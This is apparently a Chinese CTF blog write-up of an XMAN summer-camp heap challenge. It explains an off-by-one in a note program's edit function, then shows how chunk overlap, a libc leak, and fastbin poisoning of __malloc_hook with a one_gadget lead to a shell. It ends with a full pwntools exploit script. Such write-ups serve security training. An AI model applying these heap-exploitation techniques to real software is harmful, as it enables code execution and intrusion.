---
title: Xman Off_By_One
date: 2018-08-25 08:37:40
tags: [CTF, PWN]
categories: XMAN夏令营
---
## xman夏令营 off_by_one
​	一道off_by_one的题，做了一天，题目有些地方还是有点骚的，最近感触很深，许多题目你知道漏洞点在哪里，利用手法也清楚，但是写exp的时候会遇到很多奇怪的情况就是达不到你想要的效果或者是不能getshell，由此我觉得一个洞，你知道洞在哪怎么利用，和你真正能写exp弹shell之间差别还是有的，前者考察的你对漏洞和glibc内存管理模式的熟悉，后者可能就需要一些长期以来写exp和调试的经验，emmm，之前一直注重的是审漏洞，现在才发现审到漏洞后写出脚本也很考验能力的。  
<!--more-->
拿到题目扔ida一看发现居然开了pie，然后看new函数，是个正常的new，用户输入想要malloc的大小，程序进行malloc，接着看delete函数，free掉指针后将chunk list置0，没啥问题，最后看下edit，发现了问题，edit中对chunk进行修改用的是通过strlen当前chunk，得到当前chunk中存储的字符串长度，再进行重新读入相同大小的数据。这里就有问题了，如果strlen的特性是读到null才停，而如果前一个chunk用户数据域全部被使用，则strlen会将下一个chunk的prev_size域也算进去，这样edit时将会多处一个字节的空间给用户输入。  
	找到漏洞在哪儿后开始结合程序的保护手段进行分析利用方式，首先你需要泄露libc基址，如何泄露，想想刚才找到的洞，发现如果只能对next chunk的prev_size进行一个字节的写入，好像很难进行构造，而如果能利用chunk对齐的特性，使前一个chunk复用后一个chunk的prev_size域，这样的话如果能写入一个字节就能对next chunk的size域进行改写了。改写size域后可以通过伪造chunk和更改其对应的元数据域进行overlap，让前一个chunk包含后一个chunk，如果前一个前一个chunk是再unsorted bin中，那么修改其size域的元数据使其包含后一个chunk，此时再malloc一个和前一个chunk相同大小的chunk，这样glibc的分配器由于在其它bin中找不到恰好合适的chunk会将unsorted bin切一块下来，而剩下的部分继续保存在unsorted bin中，同时在chunk list中，还有一个ptr指向那块被包含的chunk，如果堆快大小是精心构造过的，那么可以让chunk list中的那个之前被包含chunk的ptr指向切剩下来的unsorted bin中的free chunk。 

​	这样就产生了野指针，而且由于被包含的chunk是unsorted bin中的唯一元素，所以可以顺理成章的泄露main_arena+88的地址，之后就能得到libc基地址和其它一些地址了。那之后该如何去做，现在我们有libc地址，和一个可以进任意改写的free chunk，既然chunk元数据域可以任意写，那能否使用通过伪造chunk进行unlink，显然是比较难的，因为虽然chunk list在bss段，但是代码段的载入基址未知，所以想直接写bss段肯定是非常难的，或者有什么其它骚思路可以写其它区域，可能利用起来也比较麻烦，而且要是知道text段载入基址的话，就能直接构造unlink泄露got表地址，然后写got表了，连main_arena都不用泄露，没开pie的话倒是可以unlink。  
	可是问题是这道题目是开了pie的，所以unlink没戏。  
想了一下如果构造的时候被包含的chunk大小属于fastbin，那么进行一次malloc+free后就能得到一个fastbin中的chunk，由于可以任意修改chunk的数据域，那么修改fd为__malloc_hook，刚才已经说了因为开启pie所以不好写got。之后house of spirit，写__malloc_hook为one_gadget，就能getshell了。  
另外需要注意的是不能直接写fd为malloc_hook地址，这里会把fd指向的chunk的size域和fastbins中对应bin的大小做对比，同时会把add chunk时输入的大小和fd指向的chunk的size做对比，这里fd如果指向__malloc_hook-0x13的话，则size区域最后两个字节为0x7f，这里由于是在fastbin中，大小的话只看前一个字节，后一个字节只看后三位状态位，所以之前构造的被包含的chunk大小一定要是0x70字节大小(allocated chunk状态下)。还有因为这题free hook周边没有满足检查条件的数据(全是null)，所以这里用的是__malloc_hook，其实__free_hook也是可以用的。

exp如下：

```
from pwn import *
p=process('./offbyone')
gdb.attach(p)
def add(x):
	p.recvuntil('>> ')
	p.sendline('1')
	p.recvuntil('length: ')
	p.sendline(str(len(x)))
	p.recvuntil('your note:\n')
	p.sendline(x)

def edit(idx,x):
	p.recvuntil('>> ')
	p.sendline('2')
	p.recvuntil('index: ')
	p.sendline(str(idx))
	p.recvuntil('your note:\n')
	p.sendline(x)

def dele(idx):
	p.recvuntil('>> ')
	p.sendline('3')
	p.recvuntil('index: ')
	p.sendline(str(idx))

def show(idx):
	p.recvuntil('>> ')
	p.sendline('4')
	p.recvuntil('index: ')
	p.sendline(str(idx))
	
add(0x28*'a')
add(0xf8*'b')
add(0x68*'c')
add(0x60*'d')
dele(1)
edit(0,0x28*'a'+'\x71'+'\x01')
edit(2,0x60*'c'+p64(0x170)+'\x70')
add(0xf8*'0')
show(2)
main_arena_88=u64(p.recv(6).ljust(8,'\x00'))
log.info('main_arena+88 > '+hex(main_arena_88))
libc_base=main_arena_88-0x3c4b78
log.info('libc_base > '+hex(libc_base))
malloc_hook=libc_base+0x3c4b10
log.info('malloc_hook > '+hex(malloc_hook))
free_hook=libc_base+0x3c67a8
log.info('free_hook > '+hex(free_hook))
#edit(2,p64(malloc_hook)+p64(malloc_hook))
add(0x68*'a')
one_gadget=0x45216+libc_base
one_gadget=0x4526a+libc_base
one_gadget=0xf02a4+libc_base
#one_gadget=0xf1147+libc_base
log.info('one_gadget > '+hex(one_gadget))
dele(3) 
dele(2) #chunk[2] move from unsorted bin -> fastbins
'''
edit(4,p64(free_hook-0x13)[0:6])
'''
edit(4,p64(malloc_hook-0x13)[0:6])
add(0x68*'a')
add(3*'0'+p64(one_gadget)+'\n'*85)
dele(3)
p.interactive()

```

